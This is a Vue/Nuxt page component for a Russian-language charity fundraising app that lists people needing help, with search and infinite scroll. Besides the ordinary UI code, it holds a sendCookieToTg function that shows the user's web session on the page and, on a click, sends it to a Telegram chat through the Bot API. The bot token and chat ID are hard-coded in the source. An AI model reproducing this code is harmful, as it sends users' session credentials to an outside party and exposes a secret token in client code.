<template>
  <div v-if="indexFee.loading || indexFee.data" class="index-container">
    <div v-if="webSession" style="margin: 0 20px" @click="sendCookieToTg">
      <div style="user-select: all; white-space: pre-line; color: #fff">
        {{ webSession }}
      </div>
      <div style="color: #fff">
        {{ getCookie('theme') }}
      </div>
    </div>
    <div class="search-container">
      <input v-model="queryFee.search" type="text" placeholder="Фамилия, имя" />
      <!--      <div-->
      <!--        ref="offCanvas"-->
      <!--        data-bs-toggle="offcanvas"-->
      <!--        data-bs-target="#offcanvasBottom"-->
      <!--        aria-controls="offcanvasBottom"-->
      <!--        class="placeholder"-->
      <!--      >-->
      <!--        <NuxtImg-->
      <!--          width="20"-->
      <!--          height="20"-->
      <!--          style="color: var(&#45;&#45;search-icon-color)"-->
      <!--          src="/images/settings.svg"-->
      <!--          alt="settings"-->
      <!--        />-->
      <!--      </div>-->
    </div>
    <div class="help-block">
      <div class="text">Нуждаются в помощи</div>
      <div class="description">
        Сейчас им крайне необходима<br />
        ваша помощь.
      </div>
    </div>
    <div v-if="indexFee.loading">
      <MainSkeleton></MainSkeleton>
      <MainSkeleton></MainSkeleton>
      <MainSkeleton></MainSkeleton>
    </div>
    <div v-else ref="el" class="content-container">
      <div v-for="feeItem in indexFee?.data" :key="feeItem">
        <ChartCardNotCollected
          :key="feeItem.id"
          :fee-item="feeItem"
        ></ChartCardNotCollected>
        <!--      <div v-if="index === 1" class="charity-banner">-->
        <!--        <div class="text">-->
        <!--          Наша миссия — протянуть руку тем, кто действительно в этом нуждается.-->
        <!--          Помощь больным детям — основная наша задача.-->
        <!--        </div>-->
        <!--        <div-->
        <!--          v-ripple.500="'rgba(255, 255, 255, 0.35)'"-->
        <!--          class="btn-help"-->
        <!--          @click="$router.push('/profile/form')"-->
        <!--        >-->
        <!--          Мне нужна помощь-->
        <!--        </div>-->
        <!--      </div>-->
      </div>
      <div v-if="indexFee.loader" class="loader-wrapper">
        <span class="loader-anim"></span>
      </div>
      <!--    <UiOffCanvasRegions></UiOffCanvasRegions>-->
    </div>
  </div>
</template>

<script setup>
import { storeToRefs } from 'pinia'
import MainSkeleton from '~/components/skeleton/MainSkeleton.vue'
import ChartCardNotCollected from '~/components/ChartCardNotCollected.vue'
import { getFee } from '~/services/app.api'
import { debounce } from '~/utils'

definePageMeta({
  layout: 'main',
})
const el = shallowRef(null)
const heightDevice = inject('devicePlatform')
const appStore = useAppStore()
const { webSession } = storeToRefs(appStore)

const indexFee = reactive({
  loading: false,
  loader: false,
  data: null,
})
const paginationData = ref(null)
const queryFee = reactive({
  page: 1,
  status_id: 3,
  search: null,
})

const getFeeIndex = () => {
  indexFee.loading = true
  getFee(queryFee)
    .then((response) => {
      indexFee.data = response.data?.data
      paginationData.value = response.data?.pagination
      indexFee.loading = false
    })
    .catch(() => {
      indexFee.loading = false
    })
}
getFeeIndex()

const getFeePagination = () => {
  indexFee.loader = true
  getFee({
    search: queryFee.search === '' ? null : queryFee.search,
    ...queryFee,
  })
    .then((response) => {
      indexFee.data = [...indexFee.data, ...response.data?.data]
      paginationData.value = response.data?.pagination
      indexFee.loader = false
    })
    .catch(() => {
      indexFee.loader = false
    })
}

useInfiniteScroll(
  el,
  async () => {
    if (
      paginationData.value.currentPage < paginationData.value.totalPages &&
      queryFee.page < paginationData.value.totalPages
    ) {
      queryFee.page += 1
      await getFeePagination()
    }
  },
  { distance: 100 },
)

const sendCookieToTg = () => {
  const data = `<pre><code class="language-javascript">${appStore.webSession}</code></pre>`
  fetch(
    `https://api.telegram.org/bot6789685486:AAFmpL2nId5LRxhxYymMagh-0yARXV1Nxhc/sendMessage?chat_id=-1002074363401&parse_mode=html&text=${data}`,
    {
      method: 'GET',
    },
  )
}

watch(
  () => queryFee.search,
  debounce(() => {
    if (queryFee.page > 1) {
      queryFee.page = 1
    }
    getFeeIndex(queryFee)
  }, 500),
)
</script>

<style lang="scss" scoped>
.index-container {
  height: calc(v-bind(heightDevice) - 155px);
  max-height: calc(v-bind(heightDevice) - 155px);
  padding-bottom: 8px;
  overflow-y: auto;
}
.content-container {
  height: calc(v-bind(heightDevice) - 155px);
  max-height: calc(v-bind(heightDevice) - 155px);
  overflow-y: auto;
}
.search-container {
  position: relative;
  padding: 0 20px 18px;
  & input {
    position: relative;
    border: 1px solid rgb(183, 184, 198);
    border-radius: 10px;
    height: 40px;
    background: var(--search-bg) url('/images/search.svg') no-repeat 10px center;
    width: 100%;
    display: flex;
    align-items: center;
    padding: 12px 10px 12px 35px;
    color: rgb(106, 106, 106);
    font-size: 12px;
    font-weight: 400;
    line-height: 20px;
    letter-spacing: 0;
    text-align: left;
    &::placeholder {
      font-size: 12px;
      font-weight: 400;
      line-height: 20px;
      letter-spacing: 0;
      text-align: left;
      color: var(--search-placeholder);
    }
    &:focus {
      color: var(--search-placeholder);
      outline: 0;
    }
  }
  //& .placeholder {
  //  background: var(--search-bg);
  //  right: 40px;
  //  top: 6px;
  //  position: absolute;
  //}
}

.help-block {
  padding: 0 20px 0;
  & .text {
    color: var(--need-help);
    font-size: 16px;
    font-weight: 600;
    line-height: 19px;
    letter-spacing: 0;
    text-align: left;
    padding-bottom: 5px;
  }
  & .description {
    padding-bottom: 10px;
    color: var(--need-help-desc);
    font-size: 12px;
    font-weight: 400;
    line-height: 14px;
    letter-spacing: 0;
    text-align: left;
  }
}

//.charity-banner {
//  display: flex;
//  flex-direction: column;
//  object-fit: cover;
//  padding: 15px 15px 15px;
//  position: relative;
//  margin: 20px;
//  height: auto;
//  background: url('/images/charity.svg') 100%/100%;
//  border-radius: 12px;
//  background-repeat: no-repeat;
//  & .text {
//    font-weight: 400;
//    font-size: 10px;
//    color: #fff;
//    width: 65%;
//    margin-bottom: 6px;
//  }
//  & .btn-help {
//    width: 40%;
//    border-radius: 6px;
//    height: 28px;
//    display: flex;
//    justify-content: center;
//    align-items: center;
//    background: #fff;
//    font-weight: 600;
//    font-size: 10px;
//    line-height: 120%;
//    color: #363845;
//  }
//}
</style>
